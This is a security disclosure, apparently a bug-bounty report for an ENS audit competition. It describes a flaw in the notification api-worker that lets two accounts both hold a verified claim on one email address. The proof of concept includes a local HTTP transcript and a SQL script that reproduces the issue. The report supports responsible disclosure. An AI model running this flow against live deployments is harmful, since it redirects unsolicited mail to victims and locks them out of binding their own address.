# 89569 w a low email notification channels are not unique per address an attacker can bind a victim s email to their own account take the address out of the victim s reach and have ens mail del&#x20;

**Submitted on Aug 19th 2026 at 22:32:28 UTC by @furkanumut for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89569
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing details of other users (including modifying browser local storage) without already-connected wallet interaction and with significant user interaction, such as:
* Iframing leading to modifying the backend/browser state (must demonstrate impact with PoC)

## Description

### Brief/Intro

The api-worker tries to enforce "one account per verified email address" — `POST /notifications/channels/email` returns *"This email address is already linked to another account"* — but the rule is unenforceable as written. The guard runs at request time and matches only `status='verified'`, the table's uniqueness is `(user_id, channel, target)` so the database cannot back it up, and the unauthenticated `POST /notifications/channels/email/verify` blind-writes `status='verified'` without re-checking. The result is that two accounts can hold a **verified** claim on one email address, and an attacker can obtain that state for an address they do not own. The victim ends up with a stranger's ENS notification traffic in their inbox and, if they had not yet linked the address themselves, is refused when they try. The attacker's row is invisible and undeletable from the victim's session.

This is a genuine invariant violation with a bounded, recoverable impact. I set out the limits explicitly in Impact Details rather than leaving them for triage to find.

### Vulnerability Details

Three defects interact. Each is individually harmless.

**(1) The cross-account guard runs at request time and only sees `verified` rows.**

`workers/api-worker/src/app/routes/notifications/channels/email.ts`:

```ts
// Check if email is linked to another user
const otherUserChannel = await c.var.db.query.userChannels.findFirst({
  where: and(
    eq(TABLE.userChannels.channel, 'email'),
    eq(TABLE.userChannels.target, email),
    eq(TABLE.userChannels.status, 'verified'),   // <-- pending rows are invisible here
  ),
})

if (otherUserChannel && otherUserChannel.user_id !== userId) {
  return c.json(
    { error: 'This email address is already linked to another account' },
    400,
  )
}
```

A `pending` claim by another account does not block a new claim. This is a check-then-act: the check happens when the channel is *requested*, but the state it guards is only committed later, at verification.

**(2) The database cannot backstop the rule.**

`workers/api-worker/src/core/database/schema/notifications.ts`:

```ts
export const userChannels = pgTable(
  'user_channels',
  { /* ... */ },
  (table) => [
    unique('user_channel_unique').on(
      table.user_id,      // scoped per account …
      table.channel,
      table.target,       // … so the SAME target may repeat across accounts
    ),
  ],
)
```

and identically in the shipped migration, `workers/api-worker/drizzle/0000_vengeful_golden_guardian.sql`:

```sql
CREATE TABLE "user_channels" (
	...
	CONSTRAINT "user_channel_unique" UNIQUE("user_id","channel","target")
);
```

I grepped all five migrations: `user_channel` appears only in `0000`. Migrations `0001_material_talkback.sql` through `0004_add_transactions.sql` never touch `user_channels` or `channel_verifications`, so there is no later global unique index and no partial unique index on verified rows.

**(3) The commit point re-validates nothing.**

Same file:

```ts
.post(
  '/verify',
  vValidator('json', verifyEmailChannelBodySchema),
  injectDb,                         // <-- note: no ...requireAuth
  async (c) => {
    const { token } = c.req.valid('json')

    const verification = await c.var.db.query.channelVerifications.findFirst({
      where: and(
        eq(TABLE.channelVerifications.token, token),
        eq(TABLE.channelVerifications.purpose, 'verify'),
        gt(TABLE.channelVerifications.expires_at, new Date()),
      ),
      with: { channel: true },
    })

    if (!verification) {
      return c.json({ error: 'Invalid or expired verification token' }, 400)
    }

    // Mark channel as verified
    await c.var.db
      .update(TABLE.userChannels)
      .set({ status: 'verified', verified_at: new Date() })
      .where(eq(TABLE.userChannels.id, verification.channel_id))  // <-- no rival-row check
```

The token is bound to a `channel_id`, and that channel belongs to whichever account **requested** verification — not to whoever clicks the link. So clicking a link verifies the requester's channel.

**Why the attacker cannot simply self-verify.** The token is never returned to the requester. `POST /channels/email` selects `token` in its `.returning(...)` but its response body is `{ message, expires_at, channelId }`; `POST /channels/:id/resend` likewise selects it and returns only `{ message }`. The token is strong (`generateToken()` in `services/notifications/helpers.ts` is 16 bytes of `crypto.getRandomValues`, hex-encoded). Victim interaction is therefore genuinely required — this is not a token-guessing or token-leak issue.

**Why the two mails are indistinguishable.** Both accounts' mails come from the same `sendVerificationEmail` (`workers/api-worker/src/services/email/verification.ts`), the same `EMAIL_FROM_ADDRESS`, with one fixed subject (`Verify your email address - ENS Notifications`) and one fixed body. Only the token in the URL differs.

**Why the victim cannot clean it up through the app.** `DELETE /notifications/channels/:id` (`channels/$id.ts`) filters `and(eq(id, channelId), eq(user_id, userId))`, and `GET /channels` (`channels/index.ts`) is scoped the same way. The attacker's row is invisible and undeletable from the victim's session.

**Attacker prerequisites are trivial.** `POST /auth/login` performs SIWE verification and calls `addUserIfNotExists` (`services/users/index.ts`) for any address the caller can sign for. No gas, no funds, no KYC. The rate limiter is 3 sends/hour and the attack needs one.

**(4) Corollary — the same root cause lets a third party mutate an arbitrary account's row.**

Once duplicate rows for one address exist, `workers/api-worker/src/app/routes/webhook/sendgrid.ts` becomes nondeterministic:

```ts
const channel = await db.query.userChannels.findFirst({
  where: eq(TABLE.userChannels.target, event.email),   // no user_id, no status, no orderBy
})
```

`findFirst` with no `orderBy` over a set that now contains rows from **different accounts** means a `bounce` / `spamreport` / `unsubscribe` event mutates whichever row Postgres happens to return — potentially the innocent account's. This is the same missing-uniqueness defect surfacing on a second code path, driven by a third party (SendGrid) rather than by either account.

### Impact Details

**What an attacker achieves.** An email address the attacker does not own becomes a `verified` notification channel on the attacker's account. Every `name-expiry` and `name-transferred` notification generated for the attacker's account is then dispatched to that inbox from ENS's own sender — `createNotification` (`services/notifications/create.ts`) copies `channel.target` into `notification_deliveries`, and `services/delivery/email.ts` sends to it. If the victim had not already linked that address, they are subsequently refused with `400 This email address is already linked to another account` and, per the scoping above, cannot see or remove the attacker's row through any endpoint.

**Interaction cost: two clicks.** The verification mail links to a Manager page, not the API: `services/email/verification.ts` builds `${managerAppUrl}/notifications/channels/email/verify?token=…`. That page — `apps/manager/src/routes/notifications/channels/email/verify.tsx` — reads `token` via `validateSearch`/`loaderDeps` but defines **no loader and no `useEffect`**; `handleVerify()` is reachable only from `onClick`. Its default state renders *"Click the button below to verify your email address and start receiving notifications."* with a `Verify Email Address` button. So the victim must click the mail link and then press the button. This is why I map to the "significant user interaction" row and not to either of the "up to one click" rows.

**Limits, stated up front:**

1. **Only addresses not yet linked to ENS are reachable.** If the victim has already verified that address, the guard rejects the attacker's `POST`. The target is a prospective user, not an existing one.
2. **The lockout is reversible by the victim.** `webhook/sendgrid.ts` `processEvents` resolves the channel by `eq(target, event.email)` with no `user_id` predicate, and sets `status:'bounced'` on `spamreport`/`bounce`/`dropped` or `status:'unsubscribed'` on `unsubscribe`/`group_unsubscribe`. Because the lockout guard matches only `verified`, the victim marking the unsolicited mail as spam lifts the block and lets them bind their own address. The lockout is real but self-healing, not permanent.
3. **Mail redirection is bounded, not indefinite.** `createNotification` fans out only to `verified` channels, so it stops at the first spam report or unsubscribe. Only two email templates exist (`services/delivery/templates/email.ts`: `name-expiry`, `name-transferred`) with no attacker-controlled free text. `notifications.idempotency_key` is `.unique().notNull()` and `queues/event-ingestion.ts` de-dupes on it, so the expiry cron cannot re-send for the same name/event. Volume is bounded by the attacker's distinct favourited names, once each.
4. **In the race ordering the victim is not locked out at all.** If the victim also submitted the address, their own pending token still verifies — `/verify` has no guard — so both rows end `verified` and the victim keeps their channel. Lockout arises only in the pure pre-squat ordering. The race variant is also a 50/50 mail choice, and the 3/hour rate limit is keyed on the normalized address (`normalizeEmailForRateLimit`), so attacker and victim share one budget.
5. **No escalation path exists.** Authentication is SIWE/JWT only (`app/middleware/auth.ts` — `requireJWT` + `verifyJWT`); there is no email factor, no email-based recovery, and no password reset. The binding cannot be chained into account takeover.

**Selected impact row** — *"Low: Changing details of other users (including modifying browser local storage) without already-connected wallet interaction and with significant user interaction … (must demonstrate impact with PoC)"*. The victim connects no wallet, and the change to their situation — a stranger's channel verified on their address, ENS mail arriving in their inbox, their own binding refused — is reached through significant interaction: opening an unsolicited mail, following its link, and pressing an explicit confirmation button for a setup they never initiated.

**Why not High or Medium.** Both the High row (*"Changing sensitive details of other users … with up to one click"*) and the Medium row (*"Changing non-sensitive details of other users … with up to one click"*) are gated on *"up to one click of user interaction"*. The flow requires two deliberate clicks, as shown above, so neither is available. I note for completeness that the Medium row's example — enabling notifications for another user — is a close conceptual match, and I would accept Medium if the programme reads "one click" as one user-intent step rather than one literal click; but I am not claiming it.

**Not a known issue.** I checked all 60 entries in the Known Issues list. None covers email-channel uniqueness or consume-time re-validation. `R2-05` is the SendGrid event-webhook fail-open — a different root cause, and the shipped handler now returns 500 when the verification key is unset, so it appears already remediated. `EXP-INPUT-003` is client-side persisted state. `SEC-MGR-003` is the API base-URL override. `EXP-INPUT-008` is EXIF. `EXP-INPUT-009` is the push service worker. Part 2's QA/tracker list contains no notification-channel entry.

### References

Vulnerable code:

* `workers/api-worker/src/app/routes/notifications/channels/email.ts` — the `verified`-only guard and the unauthenticated `POST /verify`
* `workers/api-worker/src/core/database/schema/notifications.ts` — `unique('user_channel_unique').on(user_id, channel, target)`
* `workers/api-worker/drizzle/0000_vengeful_golden_guardian.sql` — `CONSTRAINT "user_channel_unique" UNIQUE("user_id","channel","target")`
* `workers/api-worker/src/app/routes/webhook/sendgrid.ts` — `processEvents` `findFirst` keyed on `target` alone

Supporting code:

* `apps/manager/src/routes/notifications/channels/email/verify.tsx` — the two-click confirmation page
* `workers/api-worker/src/app/routes/notifications/channels/$id.ts` and `channels/index.ts` — `user_id`-scoped `DELETE` and `GET`
* `workers/api-worker/src/services/email/verification.ts` — identical mails; link target
* `workers/api-worker/src/services/notifications/helpers.ts` — `generateToken()`
* `workers/api-worker/src/services/users/index.ts` — free account creation
* `workers/api-worker/src/services/notifications/create.ts`, `services/delivery/email.ts` — mail redirection mechanism
* `workers/api-worker/src/app/middleware/auth.ts` — SIWE/JWT only, no email factor

## Proof of Concept

### A. End-to-end over HTTP against the running api-worker (primary, executed)

The full HTTP flow executed against the in-scope source tree — real route handlers, real SIWE authentication, real middleware, and the project's real schema and constraint. The api-worker is run locally exactly as its own tooling prescribes; the only substituted component is SendGrid delivery (see the deviation note below).

**Setup**

```bash
cd workers/api-worker
docker compose up -d        # postgres:17 + pg_uuidv7 (project Dockerfile) on :5432,
                            # local-neon-http-proxy on :4444
docker cp drizzle/. api-worker-postgres-1:/mig/
docker exec api-worker-postgres-1 bash -c \
  "for f in /mig/0*.sql; do psql -U postgres -v ON_ERROR_STOP=1 -f \$f; done"
# .dev.vars: throwaway JWT_SECRET; DATABASE_URL with host db.localtest.me
#   (src/core/database/index.ts routes that host to the local Neon proxy);
#   SENDGRID_API_KEY = dummy (see note)
pnpm dev:vite               # serves the worker on http://localhost:2999
```

**The one local deviation, stated precisely.** With a dummy `SENDGRID_API_KEY` the SendGrid send fails, so `POST /channels/email` returns `500 Failed to send verification email` — **after** the channel row and the verification token have already been committed (`email.ts`: channel insert at lines 75–97, token insert at lines 104–120, send attempted only at line 143; this create-then-send ordering is itself filed separately). The tokens are therefore read from `channel_verifications`, which is exactly what the two delivered mails carry — the token appears only in the mail URL and is never returned by any API response (see *"Why the attacker cannot simply self-verify"* above). Everything else on the path executes production code unmodified: SIWE login (real signature verification through the configured Sepolia RPC), the `verified`-only cross-account guard, the unauthenticated `/verify`, and the `user_id`-scoped `GET`/`DELETE`.

**Driver**: `poc_http_fc0003.mjs` — generates two throwaway keypairs, performs two real SIWE logins (`domain: app.ens.dev`, the allowlisted dev domain), then drives the exact sequence below and asserts every expected outcome. Exit code 0; **11/11 checks passed**. Full machine-readable capture: `poc_http_capture_FC-0003.json`.

**Captured run** (verbatim transcript; JWTs truncated by the capture script; account keypairs are throwaway):

```
# FC-0003 end-to-end HTTP PoC — 2026-08-19T20:46:07.399Z
target api-worker: http://localhost:2999 (local vite dev, in-scope source tree)
email under test: fc-0003-victim@example.com

account A (attacker): 0x34A4DB58c3d6d4533e83a2bbdEf65190ED078404
account B (victim):   0x165E6AEe37F0Bb4152B9FdAc25875eD8356d8665

### A: POST /auth/nonce
< HTTP 200
< {"nonce":"df103576d8dd0ebc583c…(elided)"}

### A: POST /auth/login
> body: {"address":"0x34A4DB58…","message":"app.ens.dev wants you to sign in with your
  Ethereum account:\n0x34A4DB58c3d6d4533e83a2bbdEf65190ED078404\n\n…\nURI: https://app.ens.dev
  \nVersion: 1\nChain ID: 11155111\nNonce: df103576…","signature":"0x847f917a…","nonce":"df10…"}
< HTTP 200
< {"token":"eyJhbGciOiJIUzI1NiIs…"}        ← real SIWE signature verified via Sepolia RPC

### B: POST /auth/nonce → POST /auth/login   (same shape, second throwaway keypair)
< HTTP 200

### A: POST /notifications/channels/email
> Authorization: Bearer eyJhbGciOiJI…7I1-eY
> body: {"email":"fc-0003-victim@example.com"}
< HTTP 500
< {"error":"Failed to send verification email"}   ← local dummy-key artifact; row+token committed

### B: POST /notifications/channels/email (same address)
> Authorization: Bearer eyJhbGciOiJI…EITKrI
> body: {"email":"fc-0003-victim@example.com"}
< HTTP 500
< {"error":"Failed to send verification email"}   ← NOT 400: the guard sees no *verified* row

[db] channel_verifications (stands in for the two ENS mails)
0x165e6aee37f0bb4152b9fdac25875ed8356d8665|97e3260c2930a6c99925a156b41639bb|01a01bc6-3a45-…
0x34a4db58c3d6d4533e83a2bbdef65190ed078404|818fea818343af88ca46eb37df8b625a|01a01bc6-3612-…

[db] user_channels after both adds
0x165e6aee37f0bb4152b9fdac25875ed8356d8665|pending|fc-0003-victim@example.com
0x34a4db58c3d6d4533e83a2bbdef65190ed078404|pending|fc-0003-victim@example.com

### verify with A's token — NO auth header (the call the Manager button makes)
> POST /notifications/channels/email/verify
> body: {"token":"818fea818343af88ca46eb37df8b625a"}
< HTTP 200
< {"message":"Email verified successfully"}

### A: GET /notifications/channels
< HTTP 200
< [{"id":"01a01bc6-3612-…","channel":"email","status":"verified",
   "verified_at":"2026-08-19T20:46:12.087Z", … ,"label":"fc-0003-victim@example.com"}]

### B: GET /notifications/channels
< HTTP 200
< [{"id":"01a01bc6-3a45-…","channel":"email","status":"pending",
   "verified_at":null, … ,"label":"fc-0003-victim@example.com"}]
   ← B sees only their OWN pending row; A's verified row is invisible (user_id-scoped)

### B: POST /notifications/channels/email (retry after A verified)
> Authorization: Bearer eyJhbGciOiJI…EITKrI
> body: {"email":"fc-0003-victim@example.com"}
< HTTP 400
< {"error":"This email address is already linked to another account"}   ← the lockout

### verify with B's token — NO auth header
> body: {"token":"97e3260c2930a6c99925a156b41639bb"}
< HTTP 200
< {"message":"Email verified successfully"}   ← no rival-row re-check at consume time

[db] FINAL user_channels state for the address
0x165e6aee37f0bb4152b9fdac25875ed8356d8665|verified|fc-0003-victim@example.com
0x34a4db58c3d6d4533e83a2bbdef65190ed078404|verified|fc-0003-victim@example.com

[db] assertion counts: verified_rows=2, distinct_accounts=2
=== POC PASSED — 11/11 checks ===
```

**What each captured response proves.** (i) Both accounts obtained a live verification token for one address — the request-time guard is blind to `pending` rows. (ii) `/verify` accepted A's token with **no `Authorization` header** and flipped A's row — the commit point re-validates nothing. (iii) A's `GET` shows the address `verified` on the attacker's account; B's `GET` shows only B's own `pending` row — the victim cannot see the attacker's binding. (iv) B's retry returns the exact lockout error. (v) B's token still verifies afterwards — two accounts end `verified` on one address, which the schema's `UNIQUE("user_id","channel","target")` cannot prevent.

### B. Deterministic state-transition harness against the shipped schema (supporting)

The HTTP capture in 3.A is the primary evidence: it exercises the real route handlers end to end. This harness replays the identical state transition directly against the project's real migration, so the storage-layer invariant violation is independently verifiable without running the worker or sending mail.

No shim is needed. The project's own `workers/api-worker/compose.yaml` uses a custom `Dockerfile` (`FROM postgres:17`) that compiles `pg_uuidv7` v1.6.0 from source and installs it via `init-pg-uuidv7.sql` — the same image the HTTP PoC in 3.A uses. All five migrations apply unmodified.

```bash
cd workers/api-worker
docker compose up -d postgres          # postgres:17 + pg_uuidv7 on :5432 (project Dockerfile)

docker cp drizzle/. api-worker-postgres-1:/mig/
docker exec api-worker-postgres-1 bash -c \
  "for f in /mig/0*.sql; do psql -U postgres -v ON_ERROR_STOP=1 -f \$f; done"
```

The shipped constraint is now live:

```
docker exec api-worker-postgres-1 psql -U postgres -c "\d user_channels"

Indexes:
    "user_channels_pkey" PRIMARY KEY, btree (id)
    "user_channel_unique" UNIQUE CONSTRAINT, btree (user_id, channel, target)
```

Run `poc.sql` (below), which mirrors each handler query in order:

```bash
docker cp poc.sql api-worker-postgres-1:/mig/poc.sql
docker exec api-worker-postgres-1 psql -U postgres -q -v ON_ERROR_STOP=1 -f /mig/poc.sql
```

Actual output:

```
=== STEP 1 — Mallory calls POST /channels/email { email: "alice@example.com" } ===
 guard_hits_for_mallory (0 => request allowed)
-----------------------------------------------
                                             0

=== STEP 2 — Alice calls POST /channels/email { email: "alice@example.com" } ===
 guard_hits_for_alice (0 => request allowed)
---------------------------------------------
                                           0

--- Alice inbox now holds TWO identical ENS verification mails ---
     token     |              channel_id              |            issued_to_user
---------------+--------------------------------------+--------------------------------------
 TOKEN_ALICE   | aaaaaaaa-0000-4000-8000-000000000002 | 22222222-2222-4222-8222-222222222222
 TOKEN_MALLORY | aaaaaaaa-0000-4000-8000-000000000001 | 11111111-1111-4111-8111-111111111111

=== STEP 3 — Alice opens the FIRST mail, the one Mallory triggered (POST /channels/email/verify) ===

=== STEP 4 — Alice then opens her own mail ===

=== RESULT — final state of user_channels for alice@example.com ===
                  account                   |      target       |  status
--------------------------------------------+-------------------+----------
 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa | alice@example.com | verified
 0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb | alice@example.com | verified

=== ASSERTIONS ===
 verified_rows | distinct_accounts | PASS: address verified on 2 accounts
---------------+-------------------+--------------------------------------
             2 |                 2 | t

NOTICE:  POC PASSED: 2 distinct accounts hold a VERIFIED channel for the same email address

=== SECONDARY IMPACT — Alice had NOT yet added her address (guard now blocks her) ===
 guard now returns Mallorys row - Alice is refused
---------------------------------------------------
 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

EXIT=0
```

The script runs in a transaction and ends in `ROLLBACK`, leaving no state behind.

#### `poc.sql`

```sql
BEGIN;

INSERT INTO users (id, address) VALUES
  ('11111111-1111-4111-8111-111111111111', '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), -- Mallory
  ('22222222-2222-4222-8222-222222222222', '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'); -- Alice

\echo '=== STEP 1 — Mallory calls POST /channels/email { email: "alice@example.com" } ==='
-- email.ts cross-user guard. Note status = 'verified' — pending rows are invisible.
SELECT count(*) AS "guard_hits_for_mallory (0 => request allowed)"
  FROM user_channels
 WHERE channel = 'email' AND target = 'alice@example.com' AND status = 'verified';

-- email.ts upsert, conflict target [user_id, channel, target]
INSERT INTO user_channels (id, user_id, channel, status, target)
VALUES ('aaaaaaaa-0000-4000-8000-000000000001',
        '11111111-1111-4111-8111-111111111111', 'email', 'pending', 'alice@example.com')
ON CONFLICT (user_id, channel, target)
DO UPDATE SET status = 'pending', last_verification_sent_at = now();

-- email.ts verification token, bound to the CHANNEL id (not to the requester)
INSERT INTO channel_verifications (id, user_id, channel_id, channel, purpose, token, expires_at, attempts)
VALUES ('cccccccc-0000-4000-8000-000000000001',
        '11111111-1111-4111-8111-111111111111',
        'aaaaaaaa-0000-4000-8000-000000000001',
        'email', 'verify', 'TOKEN_MALLORY', now() + interval '24 hours', 0);

\echo '=== STEP 2 — Alice calls POST /channels/email { email: "alice@example.com" } ==='
-- The SAME guard runs. Mallory's row is pending, so it still sees nothing.
SELECT count(*) AS "guard_hits_for_alice (0 => request allowed)"
  FROM user_channels
 WHERE channel = 'email' AND target = 'alice@example.com' AND status = 'verified';

-- Succeeds: the unique constraint is (user_id, channel, target).
INSERT INTO user_channels (id, user_id, channel, status, target)
VALUES ('aaaaaaaa-0000-4000-8000-000000000002',
        '22222222-2222-4222-8222-222222222222', 'email', 'pending', 'alice@example.com')
ON CONFLICT (user_id, channel, target)
DO UPDATE SET status = 'pending', last_verification_sent_at = now();

INSERT INTO channel_verifications (id, user_id, channel_id, channel, purpose, token, expires_at, attempts)
VALUES ('cccccccc-0000-4000-8000-000000000002',
        '22222222-2222-4222-8222-222222222222',
        'aaaaaaaa-0000-4000-8000-000000000002',
        'email', 'verify', 'TOKEN_ALICE', now() + interval '24 hours', 0);

\echo '--- Alice inbox now holds TWO identical ENS verification mails ---'
SELECT token, channel_id, user_id AS issued_to_user
  FROM channel_verifications ORDER BY token;

\echo '=== STEP 3 — Alice opens the FIRST mail, the one Mallory triggered (POST /channels/email/verify) ==='
-- Unauthenticated; resolved purely from the token. No rival-row check.
UPDATE user_channels
   SET status = 'verified', verified_at = now()
 WHERE id = (SELECT channel_id FROM channel_verifications
              WHERE token = 'TOKEN_MALLORY' AND purpose = 'verify' AND expires_at > now());
DELETE FROM channel_verifications WHERE token = 'TOKEN_MALLORY';

\echo '=== STEP 4 — Alice then opens her own mail ==='
UPDATE user_channels
   SET status = 'verified', verified_at = now()
 WHERE id = (SELECT channel_id FROM channel_verifications
              WHERE token = 'TOKEN_ALICE' AND purpose = 'verify' AND expires_at > now());
DELETE FROM channel_verifications WHERE token = 'TOKEN_ALICE';

\echo '=== RESULT — final state of user_channels for alice@example.com ==='
SELECT u.address AS account, c.target, c.status
  FROM user_channels c JOIN users u ON u.id = c.user_id
 WHERE c.target = 'alice@example.com'
 ORDER BY u.address;

\echo '=== ASSERTIONS ==='
SELECT
  (SELECT count(*) FROM user_channels
    WHERE target = 'alice@example.com' AND status = 'verified')  AS verified_rows,
  (SELECT count(DISTINCT user_id) FROM user_channels
    WHERE target = 'alice@example.com' AND status = 'verified')  AS distinct_accounts,
  (SELECT count(*) = 2 FROM user_channels
    WHERE target = 'alice@example.com' AND status = 'verified')  AS "PASS: address verified on 2 accounts";

DO $$
DECLARE n int;
BEGIN
  SELECT count(DISTINCT user_id) INTO n FROM user_channels
   WHERE target = 'alice@example.com' AND status = 'verified';
  IF n < 2 THEN
    RAISE EXCEPTION 'POC FAILED: only % account(s) hold a verified row', n;
  END IF;
  RAISE NOTICE 'POC PASSED: % distinct accounts hold a VERIFIED channel for the same email address', n;
END $$;

\echo '=== SECONDARY IMPACT — Alice had NOT yet added her address (guard now blocks her) ==='
SELECT u.address AS "guard now returns Mallorys row - Alice is refused"
  FROM user_channels c JOIN users u ON u.id = c.user_id
 WHERE c.channel = 'email' AND c.target = 'alice@example.com' AND c.status = 'verified'
   AND c.user_id <> '22222222-2222-4222-8222-222222222222'
 LIMIT 1;

ROLLBACK;
```
